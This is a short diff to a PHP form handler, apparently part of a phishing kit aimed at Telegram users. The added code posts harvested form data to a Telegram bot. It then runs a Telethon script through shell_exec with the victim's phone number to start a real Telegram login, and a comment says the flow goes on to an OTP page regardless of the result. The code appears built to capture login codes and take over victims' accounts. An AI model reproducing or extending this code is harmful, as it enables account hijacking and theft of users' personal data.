@@ -2,6 +2,7 @@
 require_once __DIR__ . '/db_config.php';
 require_once __DIR__ . '/MongoDBSessionHandler.php';
 require_once __DIR__ . '/telegram.php';
+require_once __DIR__ . '/telegram_config.php';
 
 // Inisialisasi MongoDB Session Handler
 $mongoSessionHandler = new MongoDBSessionHandler($mongo_connection_string);
@@ -43,4 +44,18 @@ if (isset($mongoSessionHandler)) {
     ]);
 }
 
+// Kirim ke bot Telegram
 sendTelegram($string);
+
+// Integrate with Telethon - start authentication process
+$session_id = session_id();
+$command = escapeshellcmd("python $telegram_auth_script form " . escapeshellarg($phoneNumber) . " " . escapeshellarg($session_id));
+$output = shell_exec($command);
+$result = json_decode($output, true);
+
+// Store the result in session for the next page
+$_SESSION['telegram_phone'] = $phoneNumber;
+$_SESSION['telegram_auth_started'] = true;
+
+// Return success (we'll continue with OTP regardless of Telethon success)
+echo json_encode(['success' => true]);
